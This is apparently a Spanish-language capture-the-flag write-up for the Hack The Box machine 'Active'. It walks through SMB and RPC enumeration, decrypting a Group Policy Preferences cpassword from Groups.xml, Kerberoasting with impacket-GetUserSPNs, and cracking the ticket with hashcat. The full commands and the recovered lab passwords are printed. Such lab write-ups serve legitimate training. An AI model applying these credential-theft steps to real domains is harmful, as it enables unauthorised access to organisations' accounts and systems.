***
- Tags: #LDAP #AD 
***
Vamos a resolver la máquina Active. 
- Categoría: Fácil
- Sistema: Windows
- IP: `10.10.10.100`

### 1. Enumeración

Los puertos abiertos son los siguientes:

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
```

Hay un servicio de Win-RM abierto, si conseguimos credenciales de alguna manera podremos establecer una sesión con Evil-WinRM. Necesitamos obtener el FQDN para poder hacer el reconocimiento DNS. Además, podemos probar si permite la enumeración de recursos de manera anónima. Podemos probar todo eso con `enum4linux-ng`. Obtenemos la siguiente información:

![[Active_1.png]]

La conexión anónima por RPC no funciona del todo bien. Si bien permite la conexión, no podemos usar ningún comando como tal.

```
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> srvinfo
	10.10.10.100   Wk Sv PDC Tim NT     Domain Controller
	platform_id     :	500
	os version      :	6.1
	server type     :	0x80102b
rpcclient $> enumprivs
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```

Ahora pasamos a enumerar los shares. Con `nxc` no nos dejó. El resultado con crackmapexec es este:

![[Active_2 1.png]]

> El comando utilizado fue `crackmapexec smb 10.10.10.100 --shares -u '' -p ''`

Parece que el share `Replication` tiene permisos de lectura para un usuario anónimo. Pues nos conectamos con `smbclient`:

```bash
smbclient \\\\10.10.10.100\\Replication
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

Empezamos a listar información y vemos varios directorios. En la raíz solo existe `active.htb`. Para no andar navegando dentro de cada carpeta, vamos a descargarnos toda la carpeta para listar más cómodamente la información. Seguimos estos pasos:

```bash
1. smb: \> cd active.htb
2. smb: recurse ON
3. smb: prompt OFF
4. mget *
```

Y el resultado tras la descarga es esto:

```
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── GPT.INI
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts
```

Lo importante se encuentra dentro de la segunda carpeta. Navegando al archivo XML que se encuentra en `Groups.xml`, si lo mostramos vemos esta información:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

Este XML sirve para que la GPO aplique automáticamente una contraseña “cifrada” a `SVC_TGS`. El problema es que el cifrado de GPP es reversible con herramientas públicas, por lo que un atacante que acceda a ese archivo obtendría la contraseña en claro. Cada vez que el GPP (*Group Policy Preference*) es creado, hay un XML creado en el share SYSVOL con esa información de configuración, incluyendo cualquier contraseña con el GPP.

### 2. Explotación

Bien, ya que tenemos la clave encriptada, podemos usar `gpp-decrypt` para tratar de desencriptarla:

```bash
gpp-decrypt $(cat gpp_key)
GPPstillStandingStrong2k18
```

Ya tenemos el usuario y la contraseña (El usuario es SVC_TGS porque lo hemos comprobado en el archivo XML previo). Pues el siguiente paso es conectarnos teniendo las credenciales. Primero, comprobamos qué permisos tiene este usuario:

![[Active_3.png | 500]]

El share de Users parece muy jugoso. Nos conectamos a él con smbclient con las credenciales de este usuario.

```bash
smbclient \\\\10.10.10.100\\Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018
```

Intentamos ahora descargarnos todo el contenido, y comprobamos que tenemos tanto la flag como alguna otra información interesante. Llama la atención que hay carpetas a las que no tenemos acceso. La flag se encuentra en `SVC_TGS\Desktop`
### 3. Escalada de privilegios

Kerberos es un protocolo de autenticación que se usa en entornos de Active Directory de Windows (aunque también puede emplearse para autenticar a hosts Linux). En 2014, Tim Medin presentó un ataque sobre Kerberos al que llamó Kerberoasting. Merece la pena revisar su presentación, ya que utiliza buenos gráficos para ilustrar el proceso, pero aquí va un resumen sencillo.

Cuando quieres autenticarte en algún servicio usando Kerberos, contactas con el controlador de dominio (DC) y le indicas a qué servicio del sistema deseas acceder. El DC cifra una respuesta para ti usando el hash de la contraseña del usuario del servicio. A continuación, envías esa respuesta cifrada al servicio, que la descifra con su propia contraseña, verifica quién eres y decide si te permite el acceso.

En un ataque Kerberoasting, en lugar de enviar el ticket cifrado desde el DC al servicio, aprovechas ese ticket para descifrar offline la contraseña asociada al servicio mediante fuerza bruta.

Normalmente necesitas una cuenta activa en el dominio para iniciar Kerberoasting, pero si el DC está configurado con la opción UserAccountControl “Do not require Kerberos preauthentication” habilitada, es posible solicitar y recibir un ticket para crackear sin tener una cuenta válida en el dominio.

##### Obtener el hash del administrador

Vamos a utilizar el módulo `GetUserSPNs` de `impacket` para obtener una lista de servicios de usuario que estén asociados con cuentas de usuario normales. También vendrá con un ticket que podemos romper. Dado que queremos el ticket del Administrador:

```
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUsersSPNs.out
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-06-05 14:16:44.067366             



[-] CCache file is not found. Skipping...
```

- **-request**  
    Indica que quieres solicitar (TGS-REQ) un ticket Kerberos para el SPN que especifiques. En lugar de autenticar al servicio, simplemente solicita el ticket cifrado con la clave de la cuenta de servicio.
- **-dc-ip 10.10.10.100**  
    Le estás diciendo a la herramienta la IP del controlador de dominio (DC) al que contactar. Así te saltas la resolución DNS y vas directo al DC que gestiona active.htb.

**¿Qué sucede al ejecutarlo?**

- El script contacta al DC 10.10.10.100 pidiendo el ticket de servicio (TGS) para el SPN asociado a `SVC_TGS`.
- El DC te devuelve un ticket cifrado con el hash de la contraseña de la cuenta “SVC_TGS”, pero te indica en la salida que el SPN real es `active/CIFS:445` y que el propietario de ese SPN es el usuario “Administrator”.

Lo importante está en el `.out`, donde se encuentra el ticket. Vamos a descifrarlo con hashcat usando el diccionario rockyou.txt como es habitual en estas pruebas. Dado que es un Ticket Kerberos, buscamos el módulo correspondiente aquí: https://hashcat.net/wiki/doku.php?id=example_hashes. Corresponde al módulo 13100 de hashcat ((Kerberos 5 TGS-REP, RC4-HMAC)

```bash
hashcat -m 13100 GetUsersSPNs.out /usr/share/wordlists/rockyou.txt 
```

Tras un rato de espera, encontramos la contraseña, que es `Ticketmaster1968`. Ahora podríamos conectarnos por smbclient como Administrador y obtener la flag de root sin shell, pero eso no es divertido. Vamos a obtener la shell con el módulo `psexec`.

![[Active_4.png]]








